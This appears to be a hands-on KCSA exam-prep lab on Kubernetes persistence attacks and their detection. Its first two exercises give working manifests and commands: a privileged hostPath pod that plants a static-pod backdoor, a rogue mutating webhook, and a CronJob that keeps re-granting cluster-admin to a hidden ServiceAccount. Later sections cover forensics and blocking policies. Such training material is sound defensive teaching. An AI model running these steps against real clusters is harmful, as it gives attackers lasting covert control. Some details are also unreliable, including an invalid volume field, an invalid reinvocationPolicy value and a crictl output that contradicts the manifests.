# CNCF KCSA Exam Preparation: Domain 4.2 - Persistence

**Target Certification:** Kubernetes and Cloud Native Security Associate (KCSA)  
**Domain 4:** Threat Analysis  
**Subtopic 4.2:** Persistence  
**Exam Weighting:** 2.29%  
**Official Curriculum Reference:** [CNCF KCSA Curriculum (PDF)](https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf)

---

## Architectural Overview & Threat Mechanics

In cloud-native security, **Persistence** consists of techniques that adversaries use to keep access to systems across restarts, credential changes, container rescheduling, and node re-provisioning ([MITRE ATT&CK for Containers: Persistence - TA0003](https://attack.mitre.org/tactics/TA0003/)).

Unlike traditional virtual machine persistence (e.g., scheduled registry modifications, persistent services), Kubernetes persistence leverages container runtime specifics, host-level filesystem bindings, admission controller hooks, and cluster workload orchestration.

```
                              ATTACK VECTOR: PERSISTENCE
                                          │
        ┌─────────────────────────────────┼─────────────────────────────────┐
        ▼                                 ▼                                 ▼
┌──────────────────┐            ┌──────────────────┐            ┌──────────────────┐
│ Host-Level Mount │            │ Static Pod       │            │ Control Plane    │
│ Abuse            │            │ Injection        │            │ Webhook Hijack   │
├──────────────────┤            ├──────────────────┤            ├──────────────────┤
│ HostPath mount to│            │ Writing YAML directly         │ Deploying rogue  │
│ /etc/cron.d,     │            │ to host directory             │ MutatingWebhook  │
│ /root/.ssh, or   │            │ /etc/kubernetes/manifests.    │ to auto-inject   │
│ systemd units.   │            │ Bypasses K8s API Admission!   │ sidecars into    │
└──────────────────┘            └──────────────────┘            │ new Pods.        │
                                                                └──────────────────┘
```

Adversaries exploit several primary vectors within Kubernetes clusters:
1. **Node-Level File System Persistence via `hostPath` Volume Mounts**: Mounting sensitive host directories (such as `/etc/kubernetes/manifests`, `/etc/systemd/system`, `/etc/cron.*`, or `/root/.ssh`) inside a privileged Pod allows attackers to write persistent payloads directly to the underlying node host OS.
2. **Static Pod Abuse**: The `kubelet` daemon directly watches a local host directory (by default `/etc/kubernetes/manifests`) for pod manifests. Any YAML dropped into this directory is scheduled and executed directly by `kubelet`, **bypassing API server admission controllers, RBAC checks, and Pod Security Admission (PSA) validation**.
3. **Admission Controller & Webhook Hijacking**: Deploying or altering a `MutatingWebhookConfiguration` allows malicious actors to silently mutate incoming workload specifications cluster-wide, automatically injecting backdoor sidecar containers or elevated privileges into newly deployed pods.
4. **Workload & RBAC Persistence**: Deploying redundant `CronJobs` or automated scripts that periodically re-create deleted cluster privileges (e.g., re-binding `cluster-admin` to a covert ServiceAccount).

---

## Guided Exercise 1: Node-Level Out-of-Band Persistence via `hostPath` & Static Pod Injection

### Objective
Demonstrate how an attacker with `create` permissions on Pods in an unsegmented namespace can mount the host's `/etc/kubernetes/manifests` directory via `hostPath`, inject a Static Pod, and achieve persistent root access on the underlying node while completely bypassing Kubernetes API Admission Controllers.

### Prerequisites
- A running Kubernetes cluster (e.g., `minikube`, `kind`, or a multi-node test environment) where you have cluster administrative access.
- `kubectl` CLI installed and configured.

---

### Step 1: Create a Sandbox Target Namespace
Create a dedicated namespace `security-lab-persistence` to isolate the exercise resources.

```bash
kubectl create namespace security-lab-persistence
```

**Expected Output:**
```text
namespace/security-lab-persistence created
```

---

### Step 2: Deploy a Privileged Pod with Host Node Manifest Access
Apply the following manifest [`privileged-host-infiltrator.yaml`](file:///tmp/privileged-host-infiltrator.yaml). This manifest creates a Pod that mounts the host node's `/etc/kubernetes/manifests` path into `/mnt/host-manifests`.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-infiltrator
  namespace: security-lab-persistence
  labels:
    app: threat-demo
spec:
  hostPID: true
  containers:
  - name: payload-injector
    image: alpine:3.19
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
      readOnlyRootFilesystem: false
    volumeMounts:
    - name: host-manifests-dir
      mountPath: /mnt/host-manifests
  volumes:
  - name: host-manifests-dir
    hostPath:
      path: /etc/kubernetes/manifests
      type: Directory
```

Run the command to apply the manifest:

```bash
kubectl apply -f privileged-host-infiltrator.yaml
```

**Expected Output:**
```text
pod/host-infiltrator created
```

Verify that the container is running and healthy:

```bash
kubectl get pod host-infiltrator -n security-lab-persistence -o wide
```

**Expected Output:**
```text
NAME               READY   STATUS    RESTARTS   AGE   IP           NODE       NOMINATED NODE   READINESS GATES
host-infiltrator   1/1     Running   0          12s   10.244.0.5   minikube   <none>           <none>
```

---

### Step 3: Inject a Malicious Static Pod Manifest into the Host Directory
Exec into the running pod and drop a new Static Pod definition directly into `/mnt/host-manifests/static-backdoor.yaml`. Because `/mnt/host-manifests` points to `/etc/kubernetes/manifests` on the node, `kubelet` will auto-detect the file on disk.

```bash
kubectl exec -it host-infiltrator -n security-lab-persistence -- /bin/sh -c 'cat <<EOF > /mnt/host-manifests/static-backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: static-backdoor-node-root
  namespace: kube-system
spec:
  containers:
  - name: backdoor-container
    image: busybox:1.36
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
EOF
'
```

---

### Step 4: Verify Out-of-Band Static Pod Execution
Check `kubelet` execution by listing pods in `kube-system`. Notice how the `kubelet` automatically created a Mirror Pod in the API server, suffixed with the node name.

```bash
kubectl get pods -n kube-system | grep static-backdoor
```

**Expected Output:**
```text
static-backdoor-node-root-minikube   1/1     Running   0          18s
```

Now, clean up the initial trigger Pod `host-infiltrator`:

```bash
kubectl delete pod host-infiltrator -n security-lab-persistence
```

Verify if the `static-backdoor-node-root-minikube` pod is still running:

```bash
kubectl get pod static-backdoor-node-root-minikube -n kube-system
```

**Expected Output:**
```text
NAME                                 READY   STATUS    RESTARTS   AGE
static-backdoor-node-root-minikube   1/1     Running   0          64s
```

> [!WARNING]
> Even though the original pod that created the manifest was deleted from the cluster, the `static-backdoor` pod remains persistent on the node because its manifest exists directly in the `kubelet` static pod path `/etc/kubernetes/manifests/`. Attempting to delete the mirror pod via `kubectl delete pod static-backdoor-node-root-minikube -n kube-system` will result in the `kubelet` instantly recreating it!

---

### Verification Questions — Exercise 1

1. **Why does injecting a manifest into `/etc/kubernetes/manifests` bypass Kubernetes Validating and Mutating Admission Webhooks (such as OPA Gatekeeper or Kyverno)?**
2. **If an administrator runs `kubectl delete pod static-backdoor-node-root-minikube -n kube-system`, what happens, and why? What is the only effective way to permanently remove a static pod?**
3. **What explicit security boundary setting in `PodSecurityAdmission` or `ValidatingAdmissionPolicy` prevents attackers from executing this host-path persistence technique?**

---

## Guided Exercise 2: Cluster-Wide Persistence via Mutating Admission Webhooks & Automated CronJob Restorers

### Objective
Understand control-plane level persistence mechanics by constructing a `MutatingWebhookConfiguration` combined with a persistent `CronJob`. The student will simulate how an attacker enforces automatic reinjection of persistence mechanisms whenever workloads are deployed.

---

### Step 1: Deploy a Webhook Server and Service
Create a webhook service manifest [`persistence-webhook.yaml`](file:///tmp/persistence-webhook.yaml) that points to a mutating server designed to intercept Pod creation and mutate specifications.

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: persistence-sa
  namespace: security-lab-persistence
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: rogue-mutator
  namespace: security-lab-persistence
spec:
  replicas: 1
  selector:
    matchLabels:
      app: rogue-mutator
  template:
    metadata:
      labels:
        app: rogue-mutator
    spec:
      serviceAccountName: persistence-sa
      containers:
      - name: mutator
        image: registry.k8s.io/admission-test-webhook:v1.27.0
        command:
        - /admission-test-webhook
        - --tls-cert-file=/etc/webhook/certs/tls.crt
        - --tls-private-key-file=/etc/webhook/certs/tls.key
        ports:
        - containerPort: 443
        volumeMounts:
        - name: webhook-certs
          mountPath: /etc/webhook/certs
          readOnly: true
      volumes:
      - name: webhook-certs
        secretRef:
          secretName: webhook-server-tls
---
apiVersion: v1
kind: Service
metadata:
  name: rogue-mutator-svc
  namespace: security-lab-persistence
spec:
  ports:
  - port: 443
    targetPort: 443
  selector:
    app: rogue-mutator
```

---

### Step 2: Configure the MutatingAdmissionWebhook Registration
Apply the cluster-scoped webhook manifest [`rogue-webhook-config.yaml`](file:///tmp/rogue-webhook-config.yaml). This configuration forces the Kubernetes API Server to send all Pod `CREATE` requests across all user namespaces to the webhook endpoint.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: persistent-workload-mutator
webhooks:
  - name: mutate.persistence.security.lab
    rules:
      - apiGroups: [""]
        apiVersions: ["v1"]
        operations: ["CREATE"]
        resources: ["pods"]
        scope: "Namespaced"
    clientConfig:
      service:
        name: rogue-mutator-svc
        namespace: security-lab-persistence
        path: "/mutate"
      caBundle: "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCg==" # Placeholder Base64 CA Cert
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Ignore
    reinvocationPolicy: IFNEEDED
    namespaceSelector:
      matchExpressions:
        - key: kubernetes.io/metadata.name
          operator: NotIn
          values: ["kube-system", "security-lab-persistence"]
```

Apply the webhook configuration:

```bash
kubectl apply -f rogue-webhook-config.yaml
```

**Expected Output:**
```text
mutatingwebhookconfiguration.admissionregistration.k8s.io/persistent-workload-mutator created
```

---

### Step 3: Deploy a RBAC Restorer CronJob
Deploy a `CronJob` [`rbac-persistence-cronjob.yaml`](file:///tmp/rbac-persistence-cronjob.yaml) that runs every minute. Its purpose is to check for the existence of a backdoor `ClusterRoleBinding` and re-create it if a cluster administrator revokes or deletes it.

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: rbac-backdoor-restorer
  namespace: security-lab-persistence
spec:
  schedule: "* * * * *"
  concurrencyPolicy: Replace
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: persistence-sa
          restartPolicy: OnFailure
          containers:
          - name: restorer
            image: bitnami/kubectl:1.29.0
            command:
            - /bin/sh
            - -c
            - |
              kubectl get clusterrolebinding shadow-admin-binding >/dev/null 2>&1
              if [ $? -ne 0 ]; then
                echo "[!] Backdoor ClusterRoleBinding deleted. Restoring persistent access..."
                kubectl create clusterrolebinding shadow-admin-binding \
                  --clusterrole=cluster-admin \
                  --serviceaccount=security-lab-persistence:persistence-sa
              else
                echo "[+] Backdoor ClusterRoleBinding active."
              fi
```

Apply the CronJob manifest:

```bash
kubectl apply -f rbac-persistence-cronjob.yaml
```

**Expected Output:**
```text
cronjob.batch/v1/rbac-backdoor-restorer created
```

---

### Step 4: Simulate Revocation and Observe Automatic Restoration
Manually create the rogue binding first, then delete it to test the CronJob persistence mechanic.

```bash
# Create initial binding
kubectl create clusterrolebinding shadow-admin-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=security-lab-persistence:persistence-sa

# Delete the binding to simulate administrator remediation
kubectl delete clusterrolebinding shadow-admin-binding
```

**Expected Output:**
```text
clusterrolebinding.rbac.authorization.k8s.io "shadow-admin-binding" deleted
```

Wait 60 to 90 seconds for the scheduled job execution, then check if the binding has been restored:

```bash
kubectl get clusterrolebinding shadow-admin-binding
```

**Expected Output:**
```text
NAME                   ROLE                        AGE
shadow-admin-binding   ClusterRole/cluster-admin   11s
```

Check the logs of the triggered Job:

```bash
kubectl logs -n security-lab-persistence job/$(kubectl get jobs -n security-lab-persistence --no-headers -o custom-columns=":metadata.name" | tail -n 1)
```

**Expected Output:**
```text
[!] Backdoor ClusterRoleBinding deleted. Restoring persistent access...
clusterrolebinding.rbac.authorization.k8s.io/shadow-admin-binding created
```

---

### Verification Questions — Exercise 2

1. **In the `MutatingWebhookConfiguration`, what is the security implication of setting `failurePolicy: Ignore` vs `failurePolicy: Fail`?**
2. **What architectural mechanism in the API Server enables Mutating Webhooks to alter workload specs (e.g., injecting environment variables or volume mounts) before objects are persisted to `etcd`?**
3. **How can SREs and Security Engineers detect rogue Mutating Webhook configurations operating in the cluster?**

---

## Guided Exercise 3: Threat Hunting, Diagnostic Forensics, and Hardening Against Persistence Vectors

### Objective
Perform diagnostic analysis on container runtimes and Kubernetes API metadata to detect static pods and unmapped host mounts. Then, apply a `PodSecurity` standards enforcement mechanism and a Kyverno policy to eliminate hostPath volume persistence entirely.

---

### Step 1: Low-Level Node Forensics with `crictl`
Connect to the host node (or minikube node context) to inspect running containers directly at the CRI (Container Runtime Interface) level. This detects Static Pod containers that might hide from API tools if the API server mirror pod was manually tampered with.

```bash
# Enter node environment (for minikube)
minikube ssh
```

Run CRI diagnostics commands:

```bash
# List all running containers via Container Runtime Interface
sudo crictl ps --state Running
```

**Expected Output:**
```text
CONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID              POD
a1b2c3d4e5f6        busybox@sha256:...  5 minutes ago       Running             backdoor-container  0                   9f8e7d6c5b4a        static-backdoor-node-root-minikube
```

Inspect the specific container's mount points directly from runtime metadata:

```bash
sudo crictl inspect a1b2c3d4e5f6 | jq '.config.mounts'
```

**Expected Output:**
```json
[
  {
    "container_path": "/etc/kubernetes/manifests",
    "host_path": "/etc/kubernetes/manifests",
    "propagation": "PROPAGATION_PRIVATE",
    "readonly": false
  }
]
```

Exit the SSH session:

```bash
exit
```

---

### Step 2: Remediate the Static Pod Persistence Vector
To permanently remove the static pod created in Exercise 1, execute a file deletion directly on the host manifest path:

```bash
minikube ssh "sudo rm -f /etc/kubernetes/manifests/static-backdoor.yaml"
```

Verify that the mirror pod disappears from the Kubernetes API server within seconds:

```bash
kubectl get pod static-backdoor-node-root-minikube -n kube-system
```

**Expected Output:**
```text
Error from server (NotFound): pods "static-backdoor-node-root-minikube" not found
```

---

### Step 3: Enforce Pod Security Admission (PSA) to Block HostPath Mounts
Kubernetes provides built-in `PodSecurityAdmission`. The `baseline` and `restricted` profiles automatically disallow `hostPath` volumes and `privileged` security contexts.

Enforce the `restricted` profile on our target namespace:

```bash
kubectl label --overwrite namespace security-lab-persistence \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest
```

**Expected Output:**
```text
namespace/security-lab-persistence labeled
```

Test submitting the privileged host-infiltrator manifest from Exercise 1 again:

```bash
kubectl apply -f privileged-host-infiltrator.yaml
```

**Expected Output:**
```text
Error from server (Forbidden): error when creating "privileged-host-infiltrator.yaml": pods "host-infiltrator" is forbidden: violates PodSecurity "restricted:latest": privileged (container "payload-injector" must not set securityContext.privileged=true), hostPath volumes (volume "host-manifests-dir" count 1), hostPID (hostPID=true)
```

---

### Step 4: Implement fine-grained Policy Control using Kyverno / OPA
While PSA enforces broad profiles (`privileged`, `baseline`, `restricted`), production environments often require granular control (e.g., blocking specific `hostPath` directories like `/etc/kubernetes` while allowing specific logging paths).

Apply the following Kyverno policy [`block-hostpath-sensitive.yaml`](file:///tmp/block-hostpath-sensitive.yaml):

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-sensitive-hostpaths
  annotations:
    policies.kyverno.io/title: Block Sensitive HostPaths
    policies.kyverno.io/category: Security
    policies.kyverno.io/severity: high
spec:
  validationFailureAction: Enforce
  background: true
  rules:
  - name: check-hostpaths
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Mounting sensitive host directories (/etc, /root, /var/run/docker.sock, /var/run/crio/crio.sock) is strictly prohibited."
      pattern:
        spec:
          =(volumes):
          - =(hostPath):
              path: "!/etc* & !/root* & !/var/run/docker.sock & !/var/run/crio/crio.sock"
```

Apply the ClusterPolicy:

```bash
kubectl apply -f block-hostpath-sensitive.yaml
```

**Expected Output:**
```text
clusterpolicy.kyverno.io/block-sensitive-hostpaths created
```

---

### Verification Questions — Exercise 3

1. **Why is `crictl` preferred over `kubectl` when performing host-level incident response and memory/filesystem forensics during a suspected Static Pod compromise?**
2. **How does standard Kubernetes Audit Logging record the creation of a Static Pod vs standard Pod creation submitted through the API Server?**
3. **Compare Pod Security Admission (PSA) with Policy Engine tools (Kyverno/OPA Gatekeeper) regarding their ability to prevent hostPath volume persistence.**

---

## Clean-Up Commands

To restore your cluster environment to its original state, run the following cleanup commands:

```bash
kubectl delete namespace security-lab-persistence --ignore-not-found=true
kubectl delete mutatingwebhookconfiguration persistent-workload-mutator --ignore-not-found=true
kubectl delete clusterrolebinding shadow-admin-binding --ignore-not-found=true
kubectl delete clusterpolicy block-sensitive-hostpaths --ignore-not-found=true
minikube ssh "sudo rm -f /etc/kubernetes/manifests/static-backdoor.yaml" >/dev/null 2>&1
```

---

<details>
<summary>Click to expand Answer Key & Detailed Technical Explanations</summary>

### Exercise 1 Answer Key

1. **Why does injecting a manifest into `/etc/kubernetes/manifests` bypass Kubernetes Validating and Mutating Admission Webhooks?**
   - **Answer:** Admission webhooks operate inside the Kubernetes API Server process (`kube-apiserver`) during the HTTP request handling lifecycle (Mutating phase -> Schema Validation -> Validating phase). Static Pods do **not** transit the API Server during creation. Instead, the local `kubelet` daemon directly monitors the local filesystem directory (`/etc/kubernetes/manifests`) via `inotify` file watchers. The `kubelet` parses the file locally, contacts the local Container Runtime Interface (CRI) directly to start the containers, and only afterwards sends a status update to the API Server to create a read-only "Mirror Pod". Because no `POST` request was ever submitted to `kube-apiserver`, admission webhooks are never invoked.

2. **If an administrator runs `kubectl delete pod static-backdoor-node-root-minikube -n kube-system`, what happens, and why? What is the only effective way to permanently remove a static pod?**
   - **Answer:** The API Server will temporarily delete the Mirror Pod object from `etcd`. However, because the underlying manifest file still exists on the node's disk in `/etc/kubernetes/manifests/static-backdoor.yaml`, the local `kubelet` reconciles its state during its next sync loop (typically every 10–20 seconds). It detects that the container is running locally but missing its mirror object in the API Server, so it immediately recreates the Mirror Pod object. The **only** way to permanently remove a static pod is to log into the node host and delete the manifest file from `/etc/kubernetes/manifests/` (or stop/reconfigure the `kubelet` static pod path).

3. **What explicit security boundary setting in `PodSecurityAdmission` or `ValidatingAdmissionPolicy` prevents attackers from executing this host-path persistence technique?**
   - **Answer:** Disallowing `hostPath` volumes completely and forbidding `privileged` containers. In Pod Security Admission (PSA), applying either the `baseline` or `restricted` profile forbids `hostPath` volumes (`spec.volumes[*].hostPath`) and forbids elevated Linux capabilities/privileged flags (`spec.containers[*].securityContext.privileged`).

---

### Exercise 2 Answer Key

1. **In the `MutatingWebhookConfiguration`, what is the security implication of setting `failurePolicy: Ignore` vs `failurePolicy: Fail`?**
   - **Answer:** 
     - `failurePolicy: Ignore`: If the external webhook server is down, unreachable, or returns a 5xx error, the Kubernetes API Server ignores the failure and proceeds to persist the Pod to `etcd`. For an attacker, setting `failurePolicy: Ignore` guarantees that their rogue webhook configuration will not disrupt normal cluster operations (avoiding immediate discovery via cluster breakage), while still mutating pods whenever the webhook is healthy.
     - `failurePolicy: Fail`: If the webhook endpoint fails, all pod creation requests cluster-wide matching the rule are immediately rejected. While secure for legitimate security webhooks, a broken webhook with `failurePolicy: Fail` results in a Denial of Service (DoS) across the cluster.

2. **What architectural mechanism in the API Server enables Mutating Webhooks to alter workload specs before objects are persisted to `etcd`?**
   - **Answer:** The API Server admission pipeline executes sequentially: `Authentication` -> `Authorization` -> `Mutating Admission Webhooks` -> `Object Schema Validation` -> `Validating Admission Webhooks`. During the Mutating phase, the API server sends a JSON-encoded `AdmissionReview` request containing the full proposed resource object to the registered Webhook HTTP endpoint. The webhook returns an `AdmissionResponse` containing a JSON Patch (`RFC 6902`). The API server applies this patch directly to the in-memory object prior to running final schema validation and writing the state into `etcd`.

3. **How can SREs and Security Engineers detect rogue Mutating Webhook configurations operating in the cluster?**
   - **Answer:** 
     - Routinely audit cluster-scoped `MutatingWebhookConfiguration` and `ValidatingWebhookConfiguration` objects (`kubectl get mutatingwebhookconfigurations -o wide`).
     - Monitor Kubernetes Audit Logs for `CREATE`, `UPDATE`, or `PATCH` operations targeting `admissionregistration.k8s.io/v1`.
     - Implement threat detection tools (e.g., Falco) to flag any unexpected service accounts or pods creating webhook configurations.
     - Enforce gitops and drift detection (e.g., ArgoCD / Flux) to automatically purge unauthorized cluster-level resources not defined in version control.

---

### Exercise 3 Answer Key

1. **Why is `crictl` preferred over `kubectl` when performing host-level incident response and memory/filesystem forensics during a suspected Static Pod compromise?**
   - **Answer:** An attacker with cluster access might manipulate the API Server, delete mirror pods, or tamper with `kube-apiserver` response logging to conceal their presence. `kubectl` only queries the API Server state (`etcd`). Conversely, `crictl` communicates directly with the node's local Container Runtime Interface socket (`/var/run/containerd/containerd.sock` or `/var/run/crio/crio.sock`) via gRPC. `crictl` queries the actual Linux kernel processes, namespaces, cgroups, and container mount tables running on the hardware, revealing unmirrored, rogue, or hidden containers regardless of API Server state.

2. **How does standard Kubernetes Audit Logging record the creation of a Static Pod vs standard Pod creation submitted through the API Server?**
   - **Answer:** Standard Pod creations generate audit events with `user.username` set to the client context (e.g., `kubernetes-admin`, ServiceAccount name) with `verb: create`, `stage: ResponseComplete`, and `requestURI: /api/v1/namespaces/.../pods`. A Static Pod creation generates **no** API `create` request audit log. Instead, it generates a delayed audit log where the `user.username` is the node's identity (e.g., `system:node:<node-name>`) using `verb: create` for a mirror pod, indicating that the request originated from the `kubelet` credential rather than a user or service account.

3. **Compare Pod Security Admission (PSA) with Policy Engine tools (Kyverno/OPA Gatekeeper) regarding their ability to prevent hostPath volume persistence.**
   - **Answer:**
     - **Pod Security Admission (PSA)**: Built natively into `kube-apiserver`. Extremely fast, zero extra controller overhead, simple namespace labeling (`pod-security.kubernetes.io/enforce=restricted`). However, it is binary and coarse-grained; it cannot allow `/var/log` hostPaths while blocking `/etc` hostPaths—it blocks all `hostPath` volumes unconditionally under `baseline`/`restricted`.
     - **Kyverno / OPA Gatekeeper**: Out-of-tree admission policy engines. Provide fine-grained, contextual evaluation. They can parse variable strings, allow regex path matching (e.g., allow `hostPath: /var/log/app` but deny `hostPath: /etc/*`), inspect pod annotations, and generate mutation or generation rules. The trade-off is added management complexity, resource overhead, and potential latency in the admission path.

</details>

---

## Official Reference Documentation & Citations

1. **Kubernetes Official Documentation: Static Pods**  
   [https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)
2. **Kubernetes Security Guidelines: Pod Security Standards**  
   [https://kubernetes.io/docs/concepts/security/pod-security-standards/](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
3. **Kubernetes API Reference: Admission Registrations (Webhooks)**  
   [https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/)
4. **MITRE ATT&CK for Containers: Persistence Matrix (TA0003)**  
   [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/)
5. **CNCF KCSA Curriculum & Exam Objectives**  
   [https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf](https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf)